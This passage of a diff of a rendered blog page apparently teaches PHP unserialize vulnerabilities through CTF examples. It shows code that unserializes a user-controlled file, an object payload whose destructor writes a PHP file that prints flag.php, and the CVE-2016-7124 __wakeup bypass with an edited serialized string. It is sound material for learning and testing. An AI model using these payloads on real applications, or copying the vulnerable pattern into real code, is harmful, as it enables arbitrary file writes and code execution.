-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __destruct(){
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;file_put_contents&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;dirname&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__FILE__&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;, $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$file_name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;filename&amp;#39;&lt;/span&gt;];
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;You have readfile &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $file_name;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;unserialize&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;file_get_contents&lt;/span&gt;($file_name));
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;foo&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; $file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;2.txt&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; $data &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;test&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; __destruct(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;        &lt;span style="color:#a6e22e"&gt;file_put_contents&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;dirname&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;__FILE__&lt;/span&gt;) &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; $this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;file&lt;/span&gt;, $this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;data&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$file_name &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;filename&amp;#39;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;print&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;You have readfile &amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; $file_name;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;unserialize&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;file_get_contents&lt;/span&gt;($file_name));
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;分析代码，&lt;code&gt;$file_name&lt;/code&gt;参数可控，存在反序列化情况，只要新建一个对象那么就会在文件里面写指定内容，但是内容和文件名都是可控的。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt;{
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;get.php&amp;#34;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;?php show_source(&amp;#39;flag.php&amp;#39;);?&amp;gt;&amp;#34;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __destruct(){
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;file_put_contents&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;dirname&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__FILE__&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;, $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt;();
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;serialize&lt;/span&gt;($a);
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-17-10-05.png&#34;
-	width=&#34;1326&#34;
-	height=&#34;458&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-17-10-05_huf8cc321540b76a6771eb3042ebeb2e4b_48752_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-17-10-05_huf8cc321540b76a6771eb3042ebeb2e4b_48752_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;foo&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; $file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;get.php&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; $data &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;lt;?php show_source(&amp;#39;flag.php&amp;#39;);?&amp;gt;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; __destruct(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;        &lt;span style="color:#a6e22e"&gt;file_put_contents&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;dirname&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;__FILE__&lt;/span&gt;) &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; $this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;file&lt;/span&gt;, $this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;data&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$a &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;foo&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;serialize&lt;/span&gt;($a);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-17-10-05.png"
+	width="1326"
+	height="458"
+	srcset="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-17-10-05_huf8cc321540b76a6771eb3042ebeb2e4b_48752_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-17-10-05_huf8cc321540b76a6771eb3042ebeb2e4b_48752_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;289&#34;
-		data-flex-basis=&#34;694px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-17-11-24.png&#34;
-	width=&#34;1173&#34;
-	height=&#34;649&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-17-11-24_hu3c08b63b25054597133a35dc9175ac8d_101207_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-17-11-24_hu3c08b63b25054597133a35dc9175ac8d_101207_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;180&#34;
-		data-flex-basis=&#34;433px&#34;
+		class="gallery-image" 
+		data-flex-grow="289"
+		data-flex-basis="694px"
 	
 &gt;&lt;/p&gt;
-&lt;h2 id=&#34;不得不说的魔法函数&#34;&gt;不得不说的魔法函数&lt;/h2&gt;
-&lt;h3 id=&#34;cve-2016-7124-__wakeup绕过&#34;&gt;CVE-2016-7124 __wakeup绕过&lt;/h3&gt;
+&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-17-11-24.png"
+	width="1173"
+	height="649"
+	srcset="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-17-11-24_hu3c08b63b25054597133a35dc9175ac8d_101207_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-17-11-24_hu3c08b63b25054597133a35dc9175ac8d_101207_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="180"
+		data-flex-basis="433px"
+	
+&gt;&lt;/p&gt;
+&lt;h2 id="不得不说的魔法函数"&gt;不得不说的魔法函数&lt;/h2&gt;
+&lt;h3 id="cve-2016-7124-__wakeup绕过"&gt;CVE-2016-7124 __wakeup绕过&lt;/h3&gt;
 &lt;p&gt;&lt;strong&gt;__wakeup魔法函数简介&lt;/strong&gt;&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;unserialize()会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup() 方法，预先准备对象需要的资源&lt;br&gt;
@@ -1243,26 +1239,26 @@ show_source(__FILE__);
 &lt;p&gt;考反序列化的时候经常会遇见&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;__wakeup魔法函数绕过例题&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;index.php&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;error_reporting&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt;{
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $target &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __wakeup(){
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;target&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wakeup!&amp;#34;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __destruct(){
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;print_r&lt;/span&gt;($this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;target&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;];
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;unserialize&lt;/span&gt;($a);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;empty&lt;/span&gt;($a)){
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;show_source&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__FILE__&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;error_reporting&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;A&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; $target &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;test&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; __wakeup(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;        $this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;target&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;wakeup!&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; __destruct(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;        &lt;span style="color:#a6e22e"&gt;print_r&lt;/span&gt;($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;target&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$a &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_GET[&lt;span style="color:#e6db74"&gt;&amp;#34;test&amp;#34;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$b &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;unserialize&lt;/span&gt;($a);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;empty&lt;/span&gt;($a)){
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;  &lt;span style="color:#a6e22e"&gt;show_source&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;__FILE__&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;因为在反序列化的时候会优先执行__wakeup再执行__destruct，所以导致target属性会一直被覆盖掉，如下：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
 error_reporting(0);
 class A{
     public $target = &amp;#34;what I want?&amp;#34;;
@@ -1277,34 +1273,34 @@ class A{
 $a = new A();
 $b = serialize($a);
 print($b);
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-15-05-37.png&#34;
-	width=&#34;863&#34;
-	height=&#34;111&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-15-05-37_hu7c284679d4e883264fd9705768fc9a88_11689_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-15-05-37_hu7c284679d4e883264fd9705768fc9a88_11689_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-15-05-37.png"
+	width="863"
+	height="111"
+	srcset="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-15-05-37_hu7c284679d4e883264fd9705768fc9a88_11689_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-15-05-37_hu7c284679d4e883264fd9705768fc9a88_11689_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;777&#34;
-		data-flex-basis=&#34;1865px&#34;
+		class="gallery-image" 
+		data-flex-grow="777"
+		data-flex-basis="1865px"
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;但是只需要将&lt;code&gt;O:1:&amp;quot;A&amp;quot;:1:{s:6:&amp;quot;target&amp;quot;;s:12:&amp;quot;what I want?&amp;quot;;}&lt;/code&gt;更改成&lt;code&gt;O:1:&amp;quot;A&amp;quot;:3:{s:6:&amp;quot;target&amp;quot;;s:12:&amp;quot;what I want?&amp;quot;;}&lt;/code&gt;即可实现&lt;code&gt;__wakeup&lt;/code&gt;函数的绕过&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-15-08-13.png&#34;
-	width=&#34;819&#34;
-	height=&#34;125&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-15-08-13_hu407d8eb96e6a4a4e0e43c7b927cc444b_14727_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-15-08-13_hu407d8eb96e6a4a4e0e43c7b927cc444b_14727_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-15-08-13.png"
+	width="819"
+	height="125"
+	srcset="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-15-08-13_hu407d8eb96e6a4a4e0e43c7b927cc444b_14727_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-15-08-13_hu407d8eb96e6a4a4e0e43c7b927cc444b_14727_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;655&#34;
-		data-flex-basis=&#34;1572px&#34;
+		class="gallery-image" 
+		data-flex-grow="655"
+		data-flex-basis="1572px"
 	
 &gt;&lt;/p&gt;
-&lt;h2 id=&#34;复杂的序列化ctf题目案例&#34;&gt;复杂的序列化ctf题目案例&lt;/h2&gt;
+&lt;h2 id="复杂的序列化ctf题目案例"&gt;复杂的序列化ctf题目案例&lt;/h2&gt;
 &lt;p&gt;index.php&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
